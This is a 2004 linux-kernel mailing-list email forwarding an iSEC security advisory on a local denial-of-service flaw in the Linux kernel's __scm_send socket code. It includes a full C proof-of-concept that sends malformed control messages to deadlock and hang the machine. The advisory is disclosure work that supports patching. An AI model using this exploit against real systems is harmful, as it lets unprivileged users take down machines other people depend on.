Return-Path: <linux-kernel-owner+willy=40w.ods.org-S261568AbULNROc@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S261568AbULNROc (ORCPT <rfc822;willy@w.ods.org>);
	Tue, 14 Dec 2004 12:14:32 -0500
Received: (majordomo@vger.kernel.org) by vger.kernel.org id S261561AbULNRM5
	(ORCPT <rfc822;linux-kernel-outgoing>);
	Tue, 14 Dec 2004 12:12:57 -0500
Received: from smtp.dei.uc.pt ([193.137.203.228]:5837 "EHLO smtp.dei.uc.pt")
	by vger.kernel.org with ESMTP id S261564AbULNRLY (ORCPT
	<rfc822;linux-kernel@vger.kernel.org>);
	Tue, 14 Dec 2004 12:11:24 -0500
Date: Tue, 14 Dec 2004 17:10:56 +0000 (WET)
From: "Marcos D. Marado Torres" <marado@student.dei.uc.pt>
To: linux-kernel@vger.kernel.org
Subject: Linux kernel scm_send local DoS (fwd)
Message-ID: <Pine.LNX.4.61.0412141710250.25679@student.dei.uc.pt>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII; format=flowed
X-UC-FCTUC-DEI-MailScanner-Information: Please contact helpdesk@dei.uc.pt for more information
X-UC-FCTUC-DEI-MailScanner: Found to be clean
X-MailScanner-From: marado@student.dei.uc.pt
Sender: linux-kernel-owner@vger.kernel.org
X-Mailing-List: linux-kernel@vger.kernel.org

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1


...and it seems that that's not only one but two...

- -- 
/* *************************************************************** */
    Marcos Daniel Marado Torres	     AKA	Mind Booster Noori
    http://student.dei.uc.pt/~marado   -	  marado@student.dei.uc.pt
    () Join the ASCII ribbon campaign against html email, Microsoft
    /\ attachments and Software patents.   They endanger the World.
    Sign a petition against patents:  http://petition.eurolinux.org
/* *************************************************************** */

- ---------- Forwarded message ----------
Date: Tue, 14 Dec 2004 11:32:57 +0100 (CET)
From: Paul Starzetz <ihaquer@isec.pl>
Reply-To: security@isec.pl
To: bugtraq@securityfocus.com, vulnwatch@vulnwatch.org,
     full-disclosure@lists.netsys.com
Subject: Linux kernel scm_send local DoS


Synopsis:  Linux kernel scm_send local DoS
Product:   Linux kernel
Version:   2.4 up to and including 2.4.28, 2.6 up to and including 2.6.9
Vendor:    http://www.kernel.org/
URL:       http://isec.pl/vulnerabilities/isec-0019-scm.txt
CVE:       CAN-2004-1016
Author:    Paul Starzetz <ihaquer@isec.pl>
Date:      Dec 14, 2004


Issue:
======

A  locally  exploitable  flaw  has been found in the Linux socket layer,
that allows a local user to hang a vulnerable machine.


Details:
========

The Linux kernel provides a powerful socket API  to  user  applications.
Among other functions sockets provide an universal way for IPC and user-
kernel communication. The socket layer uses several  logical  sublayers.
One  of  the  layers,  so called auxiliary message layer (or scm layer),
augments the socket API by  an  universal  user-kernel  message  passing
capability (see recvfrom(2) for more details on auxiliary messages).

One  of  the  scm  message  parsing  functions  invoked  from the kernel
sendmsg() code is __scm_send() and suffers from a deadlock condition  if
carefully  prepared  auxiliary  message(s)  is  sent  to  a socket by an
unprivileged application.

We believe that the 2.4 kernel branch is not  further  exploitable.  The
2.6  branch  has not been extensively checked, however it may be locally
exploitable to gain elevated privileges due to its increased complexity.


Discussion:
=============

See attached code.


Impact:
=======

Unprivileged local users may hang a vulnerable Linux machine.


Credits:
========

Paul  Starzetz  <ihaquer@isec.pl>  has  identified the vulnerability and
performed further research. COPYING, DISTRIBUTION, AND  MODIFICATION  OF
INFORMATION  PRESENTED  HERE  IS ALLOWED ONLY WITH EXPRESS PERMISSION OF
ONE OF THE AUTHORS.


Disclaimer:
===========

This document and all the information it contains are provided "as  is",
for  educational  purposes  only,  without warranty of any kind, whether
express or implied.

The authors reserve the right not to be responsible for the  topicality,
correctness,  completeness  or  quality  of the information  provided in
this document. Liability claims regarding damage caused by  the  use  of
any  information  provided,  including  any kind of information which is
incomplete or incorrect, will therefore be rejected.


Appendix:
=========

/*
  *	Linux kernel 2.4 & 2.6 __scm_send DoS
  *	Warning! this code will hang your machine
  *
  *      gcc -O2 scmbang.c -o scmbang
  *
  *      Copyright (c) 2004  iSEC Security Research. All Rights Reserved.
  *
  *      THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY* IT IS PROVIDED "AS IS"
  *      AND WITHOUT ANY WARRANTY. COPYING, PRINTING, DISTRIBUTION, MODIFICATION
  *      WITHOUT PERMISSION OF THE AUTHOR IS STRICTLY PROHIBITED.
  *
  */


#define _GNU_SOURCE
#include <stdio.h>
#include <errno.h>
#include <sys/socket.h>
#include <arpa/inet.h>



static char buf[1024];



void
fatal (const char *msg)
{
     printf ("\n");
     if (!errno)
       {
 	  fprintf (stderr, "FATAL: %s\n", msg);
       }
     else
       {
 	  perror (msg);
       }
     printf ("\n");
     fflush (stdout);
     fflush (stderr);
     exit (1);
}


int
main (void)
{
     int s[2], r;
     struct sockaddr_in sin;
     struct msghdr *msg;
     struct cmsghdr *cmsg;

     r = socketpair (AF_UNIX, SOCK_DGRAM, 0, s);
     if (r < 0)
 	fatal ("socketpair");

     memset (buf, 0, sizeof (buf));
     msg = (void *) buf;
     msg->msg_control = (void *) (msg + 1);

// make bad cmsgs
     cmsg = (void *) msg->msg_control;

     cmsg->cmsg_len = sizeof (*cmsg);
     cmsg->cmsg_level = 0xdeadbebe;
     cmsg->cmsg_type = 12;	// len after overflow on second msg
     cmsg++;

// -12 for deadlock
     cmsg->cmsg_len = -12;
     cmsg->cmsg_level = SOL_IP;
     msg->msg_controllen = (unsigned) (cmsg + 1) - (unsigned) msg->msg_control;
     r = sendmsg (s[0], msg, 0);
     if (r < 0)
 	fatal ("sendmsg");

     printf ("\nYou lucky\n");
     fflush (stdout);

     return 0;
}

- --
Paul Starzetz
iSEC Security Research
http://isec.pl/


- ------------ Output from gpg ------------
gpg: WARNING: using insecure memory!
gpg: please see http://www.gnupg.org/faq.html for more information
gpg: Signature made Tue 14 Dec 2004 10:33:02 AM WET using DSA key ID 9E70A6EE
gpg: Can't check signature: public key not found

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.2.1 (GNU/Linux)
Comment: Made with pgp4pine 1.76

iD8DBQFBvx6imNlq8m+oD34RAu36AJ9S/vh/QIvMDwy+J/vYD1ArZuOvMACgnLsS
ShwvHjuPyHBlHuK2WFaA0TU=
=g+Yc
-----END PGP SIGNATURE-----

